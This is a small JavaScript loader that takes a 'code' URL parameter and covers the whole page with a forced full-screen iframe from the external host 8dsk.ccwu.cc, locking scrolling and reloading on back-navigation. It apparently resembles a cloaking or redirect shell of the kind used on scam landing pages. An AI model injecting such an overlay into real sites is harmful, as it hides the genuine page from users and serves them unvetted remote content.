(function () {
  'use strict';
  try {
    
    window.addEventListener('pageshow', function (e) {
      if (e.persisted) location.reload();
    });

    var domains = [
      '8dsk.ccwu.cc'
    ];

    var urlParams = new URLSearchParams(window.location.search);
    var code = urlParams.get('code');
    if (!code) {
      document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#f56c6c;font-size:14px;">参数错误</div>';
      return;
    }

    var idx = Math.floor(Math.random() * domains.length);
    var src = '//' + domains[idx] + '/?code=' + encodeURIComponent(code);

    var iframe = document.createElement('iframe');
    iframe.src = src;
    iframe.allow = 'autoplay; fullscreen; clipboard-write';
    iframe.setAttribute('allowfullscreen', '');

    function applySize() {
      iframe.style.cssText =
        'position:fixed!important;top:0!important;left:0!important;right:0!important;bottom:0!important;' +
        'width:' + window.innerWidth + 'px!important;' +
        'height:' + window.innerHeight + 'px!important;' +
        'border:0!important;margin:0!important;padding:0!important;' +
        'z-index:2147483647!important;background:#fff!important;display:block!important';
    }
    applySize();

    var lockStyle = document.createElement('style');
    lockStyle.textContent =
      'html,body{margin:0!important;padding:0!important;height:100%!important;width:100%!important;overflow:hidden!important;background:#fff!important;position:relative!important}';
    document.head.appendChild(lockStyle);

    document.documentElement.appendChild(iframe);
    window.scrollTo(0, 0);

    
    iframe.addEventListener('load', function () {
      applySize();
      setTimeout(applySize, 500);
    });

    window.addEventListener('resize', applySize);
    window.addEventListener('orientationchange', function () {
      setTimeout(applySize, 200);
    });
  } catch (e) {
    document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#f56c6c;font-size:14px;">系统错误</div>';
  }
})();
